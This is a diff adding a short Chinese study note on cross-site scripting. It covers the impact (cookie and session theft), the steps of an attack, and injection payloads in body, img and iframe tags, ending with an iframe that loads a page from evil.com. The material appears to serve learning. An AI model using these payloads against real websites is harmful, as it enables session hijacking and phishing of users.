@@ -1,0 +1,28 @@
+xss 
+
+最糟糕的情况是
+hacker使用javascript 获取浏览器连接网站的cookie，进而盗取用户的session
+可以修改浏览器的
+可以通过XMLHttpRequest向任何地址发送任何内容的http请求
+在现在可以支持html5 api的浏览器上可以做更多的事情（获取用户物理位置，开启网络摄像头，访问手机，访问用户特定文件）
+
+
+过程
+hacker 通过网站提交功能提交payload（javascript代码)
+引诱用户访问这个页面
+带有攻击者代码的网页在用户浏览器运行
+恶意代码会发送用户cookie到攻击者机器
+
+注入点
+<body>   通过onload属性，background属性注入
+<body onload=alert("XSS")>
+<body background="javascript:alert("XSS")">
+
+<img>  有些浏览器会解析这个标签的js代码
+<img src="javascript:alert("XSS");">
+<img dynsrc="javascript:alert('XSS')">
+<img lowsrc="javascript:alert('XSS')">
+
+<iframe>  iframe中内嵌的js代码由于安全策略无法访问父页面的dom但是仍旧可以执行钓鱼攻击
+<iframe src=”http://evil.com/xss.html”>
+
